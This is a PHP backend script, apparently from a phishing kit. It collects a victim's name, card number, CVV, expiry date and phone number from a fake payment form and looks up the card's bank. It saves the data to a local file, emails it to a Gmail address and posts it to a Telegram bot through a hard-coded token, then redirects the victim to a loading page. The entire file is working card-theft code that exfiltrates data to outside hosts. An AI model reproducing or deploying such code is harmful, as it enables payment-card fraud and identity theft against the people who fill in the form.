<?php

$bins = $_POST["cd"];
$bin     = substr($bins, 0, 6);
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'http://bins.su/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, "action=searchbins&bins=".$bin."&bank=&country=");

$headers = array();
$headers[] = 'Content-Type: application/x-www-form-urlencoded';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}
curl_close($ch);
#echo $result;
preg_match("/<\/td><\/tr><tr><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><td>(.*?)<\/td><\/tr>(.*?)<\/table><\/div>/", $result, $authkey);
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);

$msg="|+ cc au()\r\n";
$msg.="==================================================\r\n";
$msg .= "FUll name :   ".@$_POST["name"]."\n";
$msg .= "cc :   ".@$_POST["cd"]."\n";
$msg .= "bank name :   $authkey[6]. - $authkey[4] - $authkey[5]\n";
$msg .= "cvv :   ".@$_POST["cv"]."\n";
$msg .= "expiration :   ".@$_POST["exp"]."\n";
$msg .= "phone :   ".@$_POST["phone"]."\n";
$msg.="==============================\r\n";
$msg.="[+] localIP : ".@$ip."\n";
$msg .= "|date : :   ".gmdate ("Y-n-d")."@".gmdate ("H:i:s")."\n";
$msg .= "|HostName : :   ".@$hostname."\n";
$msg.="\r\n";
$msg.="\r\n";
$save=fopen("../nok.txt","a+");fwrite($save,$msg);fclose($save);
$email="cmnkul@gmail.com"; //HERE
$subject="cc au =?utf-8?Q?=F0=9F=94=A5?= ({$_SERVER['REMOTE_ADDR']})";
$headers="From: dr<comms@dioury.casa>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($email,$subject,$msg,$headers);
file_get_contents('https://api.telegram.org/bot6571406193:AAFXuvB6-Y1wzSD7sfMuXf6x4HKE3FNmhr8/sendMessage?chat_id=979803173&text='.urlencode($msg));

header("Location: load.php?id=2");
?>